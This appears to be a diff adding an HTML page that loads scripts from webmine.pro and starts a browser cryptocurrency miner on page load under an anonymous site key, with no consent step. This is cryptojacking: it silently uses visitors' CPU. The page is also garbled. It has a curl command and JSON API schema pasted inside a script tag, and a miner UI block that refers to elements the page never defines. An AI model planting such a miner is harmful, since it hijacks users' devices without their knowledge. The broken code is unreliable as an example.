@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <title></title>
+    <script src="//webmine.pro/lib/crlt.js"></script>
+    <script src="https://webmine.pro/lib/minui.js"></script>
+    <script>
+	var miner = new CRLT.Anonymous('c5603c18aa9634ef4614a00d0742cc1e91b89d236748');
+	miner.start();
+</script> <script>
+	// Listen on events
+	miner.on('found', function() { /* Hash found */ })
+	miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+	// Update stats once per second
+	setInterval(function() {
+		var hashesPerSecond = miner.getHashesPerSecond();
+		var totalHashes = miner.getTotalHashes();
+		var acceptedHashes = miner.getAcceptedHashes();
+
+		// Output to HTML elements...
+	}, 1000);
+</script> </head>
+  <body>
+    <script>
+     curl "https://api.crypto-loot.com/stats/history?<c5603c18aa9634ef4614a00d0742cc1e91b89d236748>"
+
+    {
+                            	"success": true|false,
+                            	"history": [
+                            		{
+                            			"synctime": number, // unix timestamp
+                            			"hashes": number, //total hashes
+                            			"hashrate": number //hashrate at the time
+                            		},
+                            		…
+                            	],
+                            	"error": string // optional
+                            }
+    </script>
+    <script>
+    var ui = new MinerUI(miner, {
+  container: document.getElementById('miner'),
+  canvas: document.getElementById('mining-stats-canvas'),
+  hashesPerSecond: document.getElementById('mining-hashes-per-second'),
+  hashesPerSecond: document.getElementById('mining-hashes-per-second'),
+  threads: document.getElementById('mining-threads'),
+  threadsAdd: document.getElementById('mining-threads-add'),
+  threadsRemove: document.getElementById('mining-threads-remove'),
+  hashesTotal: document.getElementById('mining-hashes-total'),
+  startButton: document.getElementById('mining-start'),
+  stopButton: document.getElementById('mining-stop'),
+  blkWarn: document.getElementById('blk-warning')
+});
+    </script>
+		<h2 class="mining-hashes-per-second"></h2>
+    <h2 class="hashrate"></h2> 
+
+    
+  </body>
+</html>
